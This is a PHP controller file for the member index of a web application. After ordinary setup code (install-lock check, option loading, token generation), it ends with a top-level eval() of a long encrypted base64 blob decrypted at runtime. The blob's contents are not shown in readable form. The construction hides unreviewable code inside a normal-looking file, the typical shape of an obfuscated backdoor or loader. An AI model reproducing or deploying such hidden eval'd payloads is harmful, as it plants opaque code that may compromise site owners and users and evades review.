<?php

/**
 *--------------------------------------
 * member index
 *--------------------------------------
 * @project		: uwa
 * @author		: cblee
 * @created		: 2014-05-20
 * @copyright	: (c)2014 AsThis
 *--------------------------------------
 */
defined('PFA_PATH') or exit('Access Denied');

class IndexCtrlr extends Ctrlr {
	protected $_o_m;

	public function __construct() {
		parent::__construct();

		if(!file_exists(CFG_PATH . D_S . 'install.lock.php')) {
			redirect(__APP__ . 'install/');
		}

		$this->_o_m = M('Option')->get_option('member');

		$_SITE = M('Option')->get_option('site');
		unset($_SITE['theme']);
		$this->assign('_SITE', $_SITE);

		$_G = M('Option')->get_option();
		unset($_G['site']);
		unset($_G['core']);
		unset($_G['index']);
		unset($_G['upload']);
		unset($_G['image']);
		$this->assign('_G', $_G);

		$timeKey = time();
		$_TK = array('timeKey' => $timeKey, 'token' => substr(md5(SOFT_SEED . $timeKey), 8, 8));
		$this->assign('_TK', $_TK);

		$this->assign('TASK', '');
		$this->assign('_GCAP', GCAP);
	}
}

eval(ACrypt::decrypt('UikMK1MoA2FTMQQkDSEFbwFsUTBUNlZvWmBbZAAnAH1SKQAAUgMHawhpVysKJwNjVidRPVI2VHdeblJnBG0FDVJjDHlTYQN1UyAEIw0pBSQBYlE2VCdWXlpvW2gAZAAyUmgAblJsByUIJlcqCiYDflZfUVlSXFRlXnJSZgRgBSZSbwxuU2YDJlMzBDUNdQVcAWlROlQwVmRabVtiAGIAf1IvAC1ScgcPCAVXCgoPAyFWPlE6UjZUZl5pUmsEZgUUUm8MbVNtAyZTaQRwDUIFRQFCUQxUA1ZAWldbSQAnAHlSJgBJUlYHUQgvVy0KJgN2VidRMVImVHdedVIgBG4FNlIzDClTewNyUyYEJA1uBW8BalEkVDZWc1orW0AAVAAyUnQAe1JsB3AINVc5CmEDYFYmUQxSMFRtXnFSIAQkBQFSQwxTU14DQ1MGBA8NTwVCAUhRFlR0VihaKlsoACsAd1I2ACFSKQczCDlXKgomAytWclF0UntUYF5iUnoEJAVpUgsMC1MBAw9TPQQ2DSkFIgFjUTpUP1ZkWlxbZAB/AD5SdQB5UnoHKggrV28KbwNmVjdRPVI2VGZeQVJhBG8FN1IvDChTKAN9U1kEWg0IBQoBDFEhVDZWdVp2W3MAaQB3UmgAeFJlB24INFcOCgwDDFZbUS5SWFQJXg5SAQQnBT5SbwxiU20DaFM3BDUNIQU+ASVRJlQ9VnJaZltzAG4ANlJqAGRScwdnCCdXQgpFA3dWK1EjUiFUOV49UmwEZgUxUnQMeFN4A3JTfAQ5DW8FYAFpUSZUN1ZkWiNbKQAjADtSbwBuUmwHbAhsV2YKQANsVj5RNlJ8VC9eJ1JbBEwFFFJSDF5TRgNHUxkEFQ0hBS0BJVEAVBxWR1pXW14ARAAYUkIASFJHB0MIQldGCi8DLFZpUV5SX1QKXg5SYQRlBXpSdQx1U3oDclM7BDwNbgV0AWBRIVR7ViVab1toAGQAMlJoAG5SbAdZCChXZwppA2hWM1E6UjtUJF5aUiEEIwVzUjsMIVN7A3JTJgQkDW4FbwFqUSRUNlZzWitbQABUADJSdAB7UmwHcAg1VzkKYQNgViZRDFIwVG1ecVIgBCQFAVJDDFNTXgNDUwYEDw1PBUIBSFEWVHRWKFoqWygAJwAsUgsAB1IABwsIBldxCmMDcVYnUSFSO1QjXmlSfQRvBT5SPQwMUwIDD1NdBC0NDAUJAQxRWlQhVmRad1t0AHUAOVImAClSZQdrCGxXZgpoA2ZWN1FoUlhUCV4OUnUEDgVYUns=', 'FUNC'));
?>